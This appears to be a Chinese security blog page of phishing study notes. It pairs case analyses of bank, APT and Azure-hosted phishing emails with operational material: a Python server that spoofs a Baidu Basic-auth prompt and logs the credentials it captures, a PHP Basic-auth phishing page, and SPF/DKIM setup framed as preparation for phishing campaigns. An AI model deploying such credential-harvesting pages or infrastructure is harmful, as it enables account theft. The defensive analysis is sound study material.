@@ -1,0 +1,1073 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="社工," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="[TOC]">
+<meta name="keywords" content="社工">
+<meta property="og:type" content="article">
+<meta property="og:title" content="邮件钓鱼">
+<meta property="og:url" content="http://yoursite.com/2019/05/16/邮件钓鱼学习计划/index.html">
+<meta property="og:site_name" content="Stephen&#39;s Blog">
+<meta property="og:description" content="[TOC]">
+<meta property="og:image" content="http://yoursite.com/uploads/dbs_201702_01.png">
+<meta property="og:image" content="http://yoursite.com/uploads/dbs_201702_02.png">
+<meta property="og:image" content="http://yoursite.com/uploads/dbs_201702_04.png">
+<meta property="og:image" content="http://yoursite.com/uploads/dbs_201702_03.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557726383768.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557725907591.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557726298525.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557731564716.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732220165.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557734848975.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557734871142.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557731720571.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557731729006.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732272728.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732328253.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732353198.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732379756.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732411222.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732473898.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557731823828.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557732561215.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557731920513.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557733204750.png">
+<meta property="og:image" content="http://yoursite.com/uploads/22.png">
+<meta property="og:image" content="http://yoursite.com/uploads/33.png">
+<meta property="og:image" content="http://yoursite.com/uploads/44.png">
+<meta property="og:image" content="http://yoursite.com/uploads/55.png">
+<meta property="og:image" content="http://yoursite.com/uploads/66.png">
+<meta property="og:image" content="http://yoursite.com/uploads/77.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557736218740.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557736240057.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557736576982.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557736779369.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557736969650.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557737006906.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557737029634.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557737051365.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557737077026.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557737282880.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557322048787.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557754032662.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557322501366.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557322529409.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557322541165.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557322561138.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1507271089368584.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1507271157944307.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1507271210222933.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1507271581286128.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557763438503.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557763832565.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557774539072.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1556153501_5cc1049ddd5cb.png!small">
+<meta property="og:image" content="http://yoursite.com/uploads/image1.png">
+<meta property="og:image" content="http://yoursite.com/uploads/sc.png">
+<meta property="og:image" content="http://yoursite.com/uploads/demo.gif">
+<meta property="og:image" content="http://yoursite.com/uploads/1557820228685.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557820256676.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557820307124.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557820322899.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557824862940.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557825071987.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557826258267.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557825559099.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557825776174.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833248322.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833460435.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833490275.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833552190.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833575867.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557833654174.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557906404207.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557906431568.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557906097512.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557906112661.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557914207203.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557918904620.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557918612171.png">
+<meta property="og:image" content="http://yoursite.com/uploads/1557920723743.png">
+<meta property="og:updated_time" content="2019-05-16T11:54:47.437Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="邮件钓鱼">
+<meta name="twitter:description" content="[TOC]">
+<meta name="twitter:image" content="http://yoursite.com/uploads/dbs_201702_01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":5},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/16/邮件钓鱼学习计划/"/>
+
+
+
+
+
+  <title>邮件钓鱼 | Stephen's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Stephen's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-movie">
+          <a href="/categories/movie" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            电影
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/16/邮件钓鱼学习计划/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/logo2.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Stephen's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">邮件钓鱼</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-16T19:54:47+08:00">
+                2019-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>[TOC]</p>
+<a id="more"></a>
+<h1 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h1><h2 id="钓鱼邮件案例分析一"><a href="#钓鱼邮件案例分析一" class="headerlink" title="钓鱼邮件案例分析一"></a>钓鱼邮件案例分析一</h2><h4 id="星展银行-垃圾邮件案例"><a href="#星展银行-垃圾邮件案例" class="headerlink" title="星展银行 - 垃圾邮件案例"></a>星展银行 - 垃圾邮件案例</h4><p>发布於 February 14th, 2017 类型： <a href="http://www.cellopoint.com/ko/taxonomy/term/2" target="_blank" rel="external">钓鱼邮件</a> </p>
+<p>这是针对DBS星展银行客户的钓鱼邮件，当收件人点选邮件中「Download Now」的链接或开启附件并点击解锁按钮，网页会被定向到钓鱼网站。这类钓鱼网站旨在窃取客户的登录和授权信息，例如：用户ID、PIN和安全代码，以执行未经授权的欺诈性交易。</p>
+<p><img src="/uploads/dbs_201702_01.png" alt="img"></p>
+<p>邮件内容大意：</p>
+<p>『亲爱的客户，</p>
+<p>请按照银行客户的要求，立即找到我们向您公司账户付款的电汇汇款详细信息。</p>
+<p>客户建议我们将付款单副本发送到您的邮件地址，以便您可以与您的银行核对并确认收到资金。</p>
+<p>附件有详细信息。</p>
+<p>注意：如果您下载附件无法查看，请以下面的下载链接替代：』</p>
+<hr>
+<p>打开附件后会看到如下图要求输入账号密码以查看PDF文件的解锁要求，但是从即将前往的网址链接就能看出这样的电子邮件非常可疑。</p>
+<h5 id="伪冒的PDF汇款信息文件"><a href="#伪冒的PDF汇款信息文件" class="headerlink" title="伪冒的PDF汇款信息文件"></a>伪冒的PDF汇款信息文件</h5><p><img src="/uploads/dbs_201702_02.png" alt="img"></p>
+<h5 id="Sender-IP-Address-来自于美国"><a href="#Sender-IP-Address-来自于美国" class="headerlink" title="Sender IP Address 来自于美国"></a>Sender IP Address 来自于美国</h5><p><img src="/uploads/dbs_201702_04.png" alt="img"></p>
+<h5 id="E-mail-Header-Received"><a href="#E-mail-Header-Received" class="headerlink" title="E-mail Header/Received"></a>E-mail Header/Received</h5><p><img src="/uploads/dbs_201702_03.png" alt="img"></p>
+<p>E-mail 的 Header/Received 中，发件人的 hostname 与星展银行没有关连性，且envelope-from被窜改成yahoo，这些迹象都说明这封邮件非常的有问题，即使spammer将From更改成“@dbsbank.com”，但一般的使用者还是可以从以上画面察觉异状，避免落入钓鱼邮件的陷阱里。</p>
+<h2 id="钓鱼邮件案例分析二"><a href="#钓鱼邮件案例分析二" class="headerlink" title="钓鱼邮件案例分析二"></a>钓鱼邮件案例分析二</h2><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><p><img src="/uploads/1557726383768.png" alt="1557726383768"></p>
+<p><img src="/uploads/1557725907591.png" alt="1557725907591"></p>
+<p><img src="/uploads/1557726298525.png" alt="1557726298525"></p>
+<h2 id="钓鱼邮件案例分析三"><a href="#钓鱼邮件案例分析三" class="headerlink" title="钓鱼邮件案例分析三"></a>钓鱼邮件案例分析三</h2><h3 id="SectorA05"><a href="#SectorA05" class="headerlink" title="SectorA05"></a>SectorA05</h3><p><img src="/uploads/1557731564716.png" alt="1557731564716"></p>
+<p><img src="/uploads/1557732220165.png" alt="1557732220165"></p>
+<p><img src="/uploads/1557734848975.png" alt="1557734848975"></p>
+<p><img src="/uploads/1557734871142.png" alt="1557734871142"></p>
+<p><img src="/uploads/1557731720571.png" alt="1557731720571"></p>
+<p><img src="/uploads/1557731729006.png" alt="1557731729006"></p>
+<p><img src="/uploads/1557732272728.png" alt="1557732272728"></p>
+<p><img src="/uploads/1557732328253.png" alt="1557732328253"></p>
+<p><img src="/uploads/1557732353198.png" alt="1557732353198"></p>
+<p><img src="/uploads/1557732379756.png" alt="1557732379756"></p>
+<p><img src="/uploads/1557732411222.png" alt="1557732411222"></p>
+<p><img src="/uploads/1557732473898.png" alt="1557732473898"></p>
+<p><img src="/uploads/1557731823828.png" alt="1557731823828"></p>
+<p><img src="/uploads/1557732561215.png" alt="1557732561215"></p>
+<p><img src="/uploads/1557731920513.png" alt="1557731920513"></p>
+<p><img src="/uploads/1557733204750.png" alt="1557733204750"></p>
+<h2 id="钓鱼邮件案例分析四"><a href="#钓鱼邮件案例分析四" class="headerlink" title="钓鱼邮件案例分析四"></a>钓鱼邮件案例分析四</h2><p><img src="/uploads/22.png" alt="22.png"></p>
+<p>近期，有研究人员发现了两股正活跃的的网络钓鱼攻击，其中涉及微软的Azure Blob。在这两股钓鱼活动中，攻击者使用了很逼真的钓鱼登录页面，拥有SSL证书以及Windows的域名。</p>
+<p>这些钓鱼活动是由安全公司Edgewave的研究人员<a href="https://www.edgewave.com/phishing/feeling-blue-about-phishing/" target="_blank" rel="external">发现</a>的。</p>
+<p>第一种电子邮件钓鱼活动会要求收件人登录到他们的Office 365帐户以更新信息。这类钓鱼邮件的主题为“Action Required: [email_Address] information is outdated - Re-validate now!!”。</p>
+<p><img src="/uploads/33.png" alt="33.png"></p>
+<p>一旦用户点击邮件中的链接时，就会跳转到一个登录页面，看起来像某组织的Outlook应用。该钓鱼页面主要是用于窃取用户的电子邮件凭据。</p>
+<p><img src="/uploads/44.png" alt="44.png"></p>
+<p>第二种钓鱼活动会尝试窃取用户的Microsoft帐户凭据。这类钓鱼邮件看起来可能有点奇怪，因为它会显示Facebook的Workplace，但却把受害者导向一个微软的登陆页面。这可能是攻击者采用统一的钓鱼模板，没有更改细节导致的。</p>
+<p><img src="/uploads/55.png" alt="55.png"></p>
+<p>如果用户单击钓鱼邮件中的链接，就会被重定向到一个很真实的Microsoft帐户登录页面。</p>
+<p><img src="/uploads/66.png" alt="66.png"></p>
+<p>以上两类钓鱼登录页面都使用了Azure Blob存储，这也使得这些网络钓鱼登录页面更具说服力。</p>
+<h3 id="Azure-Blob存储"><a href="#Azure-Blob存储" class="headerlink" title="Azure Blob存储"></a>Azure Blob存储</h3><p>对于钓鱼攻击者来说，使用Microsoft的Azure Blob存储托管钓鱼登录页面的一个好处是，钓鱼页面能使用Microsoft下的windows.net域名，这使得钓鱼页面看起来合法。例如，一个现已失效的网络钓鱼URL为<code>https://1drive6e1lj8tcmteh5m.z6.web.core.windows.net/</code>。对于许多用户来说，这是一个是很权威的域名。</p>
+<p>另一个好处是，Azure Blob存储上的每个页面的URL都使用来自Microsoft的SSL证书，如下所示：</p>
+<p><img src="/uploads/77.png" alt="77.png"></p>
+<p>如果用户点击钓鱼网站的证书查看签名，它会显示这是一个微软的证书，看起来这就是微软旗下的合法网站。</p>
+<p>所有用户应密切检查网站登录URL中的可疑的域名，windows.net域名是完全不可靠的。对于Microsoft和Outlook.com登录，请务必记住，登录表单一定来自Microsoft.com、Live.com和Outlook.com域名。</p>
+<h2 id="钓鱼邮件案例分析五"><a href="#钓鱼邮件案例分析五" class="headerlink" title="钓鱼邮件案例分析五"></a>钓鱼邮件案例分析五</h2><h3 id="使用Office-365-Activities-API-调查电子邮件攻击行为"><a href="#使用Office-365-Activities-API-调查电子邮件攻击行为" class="headerlink" title="使用Office 365 Activities API 调查电子邮件攻击行为"></a>使用Office 365 Activities API 调查电子邮件攻击行为</h3><p><a href="https://www.4hou.com/technology/12264.html" target="_blank" rel="external">https://www.4hou.com/technology/12264.html</a></p>
+<p><a href="https://www.4hou.com/web/12370.html" target="_blank" rel="external">https://www.4hou.com/web/12370.html</a></p>
+<h2 id="钓鱼方法扩展"><a href="#钓鱼方法扩展" class="headerlink" title="钓鱼方法扩展"></a>钓鱼方法扩展</h2><h3 id="HTTP-Basic认证"><a href="#HTTP-Basic认证" class="headerlink" title="HTTP Basic认证"></a>HTTP Basic认证</h3><p>参考　<a href="http://www.lijiejie.com/http-basic-auth-attack-python-script/" target="_blank" rel="external">利用HTTP Basic认证进行钓鱼攻击的python脚本</a></p>
+<p><img src="/uploads/1557736218740.png" alt="1557736218740"></p>
+<p><img src="/uploads/1557736240057.png" alt="1557736240057"></p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">#encoding=utf-8</div><div class="line"> </div><div class="line">import SimpleHTTPServer</div><div class="line">import SocketServer</div><div class="line">import time</div><div class="line"> </div><div class="line"> </div><div class="line">class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):</div><div class="line">    def do_GET(self):</div><div class="line">        if str(self.headers).find(&apos;UserLogin=1&apos;) &gt; 0:    # 用户已记录，跳转</div><div class="line">            self.send_response(302)</div><div class="line">            self.send_header(&apos;Location&apos;,&apos;http://www.baidu.com/img/bdlogo.gif&apos;)</div><div class="line">            self.end_headers()</div><div class="line">        else:</div><div class="line">            if str(self.headers).find(&apos;Authorization: Basic &apos;) &gt; 0:    # 保存账号密码和Referrer</div><div class="line">                self.send_response(302)</div><div class="line">                self.send_header(&apos;Set-Cookie&apos;, &apos;UserLogin=1&apos;)</div><div class="line">                self.send_header(&apos;Location&apos;,&apos;http://www.baidu.com/img/bdlogo.gif&apos;)</div><div class="line">                with open(&apos;data\\&apos; + time.asctime().replace(&apos;:&apos;, &apos; &apos;) + &apos;.txt&apos;, &apos;w&apos;) as f:</div><div class="line">                    f.write(str(self.headers))</div><div class="line">            else:</div><div class="line">                self.send_response(401)</div><div class="line">                self.send_header(&apos;Content-type&apos;,&apos;text/html; charset=UTF-8&apos;)</div><div class="line">                self.send_header(&apos;WWW-Authenticate&apos;, &apos;Basic realm=&quot;Session Out Of Date, Please Login again [tieba.baidu.com]&quot;&apos;)</div><div class="line">                self.end_headers()</div><div class="line">        </div><div class="line">PORT = 1234</div><div class="line">httpd = SocketServer.TCPServer((&quot;&quot;, PORT), RequestHandler)</div><div class="line">print &quot;serving at port&quot;, PORT</div><div class="line">httpd.serve_forever()</div></pre></td></tr></table></figure>
+<p><a href="https://www.freebuf.com/articles/web/147207.html" target="_blank" rel="external">如何制作基础认证钓鱼页面 - FreeBuf互联网安全新媒体平台</a></p>
+<p>PHP代码 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php $valid_passwords = array(&quot;security&quot; =&gt; &quot;cafe&quot;);</div><div class="line">$valid_users =array_keys($valid_passwords);</div><div class="line"> </div><div class="line">$user = isset($_SERVER[&apos;PHP_AUTH_USER&apos;]) ?$_SERVER[&apos;PHP_AUTH_USER&apos;] : &quot;&quot;;</div><div class="line">$pass = isset($_SERVER[&apos;PHP_AUTH_PW&apos;])   ? $_SERVER[&apos;PHP_AUTH_PW&apos;]   : &quot;&quot;;</div><div class="line"> </div><div class="line">$validated = (in_array($user,$valid_users)) &amp;&amp; ($pass == $valid_passwords[$user]);</div><div class="line"> </div><div class="line">if (!$validated) &#123;</div><div class="line"> header(&apos;WWW-Authenticate: Basic realm=&quot;Corporate domain&quot;&apos;);</div><div class="line"> //header(&apos;HTTP/1.0 401 Unauthorized&apos;);</div><div class="line">  die(&quot;Not authorized&quot;);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">// If the user enters valid credentials,just show him a cat picture</div><div class="line"> </div><div class="line">header(&quot;Location:https://kpmgsecurity.files.wordpress.com/2017/06/cat.jpg&quot;)</div><div class="line"> </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557736576982.png" alt="1557736576982"></p>
+<h3 id="利用OAuth实施钓鱼"><a href="#利用OAuth实施钓鱼" class="headerlink" title="利用OAuth实施钓鱼"></a>利用OAuth实施钓鱼</h3><p>参考 <a href="https://www.freebuf.com/articles/web/119615.html" target="_blank" rel="external">案例分析：利用OAuth实施钓鱼</a></p>
+<p><img src="/uploads/1557736779369.png" alt="1557736779369"></p>
+<p><img src="/uploads/1557736969650.png" alt="1557736969650"></p>
+<p><img src="/uploads/1557737006906.png" alt="1557737006906"></p>
+<p><img src="/uploads/1557737029634.png" alt="1557737029634"></p>
+<p><img src="/uploads/1557737051365.png" alt="1557737051365"></p>
+<p><img src="/uploads/1557737077026.png" alt="1557737077026"></p>
+<p><img src="/uploads/1557737282880.png" alt="1557737282880"></p>
+<h3 id="iframe框架钓鱼行为"><a href="#iframe框架钓鱼行为" class="headerlink" title="iframe框架钓鱼行为"></a>iframe框架钓鱼行为</h3><p>参考:</p>
+<p><a href="https://uuzdaisuki.com/2018/05/21/%E5%88%86%E6%9E%90%E5%B9%B6%E5%A4%8D%E7%8E%B0%E4%B8%80%E6%AC%A1iframe%E6%A1%86%E6%9E%B6%E9%92%93%E9%B1%BC%E8%A1%8C%E4%B8%BA/" target="_blank" rel="external">分析并复现一次iframe框架钓鱼行为</a></p>
+<h3 id="Azure"><a href="#Azure" class="headerlink" title="Azure"></a>Azure</h3><p>参考:</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;mid=2247492945&amp;idx=1&amp;sn=47da7257fee00904caf144a72303b9bf&amp;chksm=e915356bde62bc7d3c7cc0d41a80efc0e3d6ef794b59521c8ea8059a722f01cf69c1c59eac39#wechat_redirect" target="_blank" rel="external">下一代网络钓鱼技术——滥用Azure信息保护功能</a></p>
+<h2 id="前期钓鱼邮件部署"><a href="#前期钓鱼邮件部署" class="headerlink" title="前期钓鱼邮件部署"></a>前期钓鱼邮件部署</h2><h3 id="设置SPF"><a href="#设置SPF" class="headerlink" title="设置SPF"></a>设置SPF</h3><p>参考：</p>
+<p><a href="http://lomu.me/post/SPF-DKIM-DMARC-PTR" target="_blank" rel="external">邮件服务器添加SPF、DKIM、DMARC、PTR提高送达率</a></p>
+<p><a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=16&amp;&amp;no=1001505" target="_blank" rel="external">QQ邮箱SPF指引</a></p>
+<p><img src="/uploads/1557322048787.png" alt="1557322048787"></p>
+<p><img src="/uploads/1557754032662.png" alt="1557754032662"></p>
+<p><img src="/uploads/1557322501366.png" alt="1557322501366"></p>
+<h3 id="设置DKIM"><a href="#设置DKIM" class="headerlink" title="设置DKIM"></a>设置DKIM</h3><p><img src="/uploads/1557322529409.png" alt="1557322529409"></p>
+<p>DomainKeys Identified Mail的缩写，域名密钥识别邮件标准。</p>
+<p><strong>下载安装EPEL：</strong></p>
+<p>64 bit:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</div></pre></td></tr></table></figure>
+<p>32 bit:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://download.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm</div></pre></td></tr></table></figure>
+<p>安装opendkim：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install opendkim</div></pre></td></tr></table></figure>
+<p><strong>生成DKIM key (修改红色部分域名)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 请替换下面的域名</div><div class="line">export domain=lomu.me</div><div class="line"></div><div class="line">mkdir /etc/opendkim/keys/$domain</div><div class="line"></div><div class="line">cd /etc/opendkim/keys/$domain</div><div class="line"></div><div class="line">opendkim-genkey -d $domain -s default</div><div class="line"></div><div class="line">chown -R opendkim:opendkim /etc/opendkim/keys/$domain</div><div class="line"></div><div class="line">echo &quot;default._domainkey.$domain $domain:default:/etc/opendkim/keys/$domain/default.private&quot; &gt;&gt; /etc/opendkim/KeyTable</div><div class="line"></div><div class="line">echo &quot;*@$domain default._domainkey.$domain&quot; &gt;&gt; /etc/opendkim/SigningTable</div></pre></td></tr></table></figure>
+<p>生成之后打开<code>/etc/opendkim/keys/domain.com/default.txt</code>，里面就是DKIM key，需要添加到DNS，主机记录为<code>default._domainkey</code>，记录值为括号里面的（去掉引号）。</p>
+<p><strong>修改openDKIM设置</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/opendkim.conf</div></pre></td></tr></table></figure>
+<ol>
+<li>将<code>Mode</code> 改为 <code>Mode sv</code> 2. 将<code>Domain</code> 改为 <code>Domain lomu.me</code>(lomu.me是之前设置的域名) 3. 将所有变量前面的<code>#</code>去掉，但是<code>KeyFile</code>、<code>Statistics</code>加上<code>#</code> 4. 再把<code>SigningTable /etc/opendkim/SigningTable</code>改成<code>SigningTable refile:/etc/opendkim/SigningTable</code></li>
+</ol>
+<p><strong>设置Postfix</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vi /etc/postfix/main.cf</div><div class="line"></div><div class="line">加上下面幾行</div><div class="line"># opendkim setup</div><div class="line">smtpd_milters = inet:127.0.0.1:8891</div><div class="line">non_smtpd_milters = inet:127.0.0.1:8891</div><div class="line">milter_default_action = accept</div></pre></td></tr></table></figure>
+<p>重启服务</p>
